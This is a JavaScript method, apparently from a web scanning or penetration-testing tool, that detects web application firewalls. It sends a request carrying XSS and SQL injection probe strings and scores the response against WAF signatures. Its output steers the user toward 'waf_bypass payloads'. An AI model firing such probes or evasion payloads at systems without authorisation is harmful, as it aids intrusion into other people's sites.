    async detectWAF(targetUrl) {
        // Send a normal request first
        const baseline = await this.request(targetUrl);
        if (!baseline.success) return { detected: false, error: baseline.error };

        // Send a malicious-looking request to trigger WAF
        const maliciousUrl = `${targetUrl}${targetUrl.includes('?') ? '&' : '?'}test=<script>alert(1)</script>&id=1' OR 1=1--`;
        const triggered = await this.request(maliciousUrl);

        const detected = [];

        for (const [wafName, sig] of Object.entries(WAF_SIGNATURES)) {
            let score = 0;

            // Check headers
            if (sig.headers) {
                const headerStr = JSON.stringify(baseline.headers || {}).toLowerCase() + JSON.stringify(triggered.headers || {}).toLowerCase();
                for (const h of sig.headers) {
                    if (headerStr.includes(h.toLowerCase())) score += 2;
                }
            }

            // Check body
            if (sig.body && triggered.body) {
                for (const b of sig.body) {
                    if (triggered.body.includes(b)) score += 3;
                }
            }

            // Check status code difference
            if (sig.status && triggered.status && sig.status.includes(triggered.status) && baseline.status !== triggered.status) {
                score += 2;
            }

            if (score >= 2) {
                detected.push({ waf: wafName, confidence: Math.min(score * 15, 100) + '%' });
            }
        }

        return {
            detected: detected.length > 0,
            wafs: detected,
            baseline_status: baseline.status,
            triggered_status: triggered.success ? triggered.status : 'failed',
            recommendation: detected.length > 0
                ? `WAF detected. Use waf_bypass payloads for ${detected.map(d => d.waf).join(', ')}`
                : 'No WAF detected. Standard payloads should work.'
        };
    }

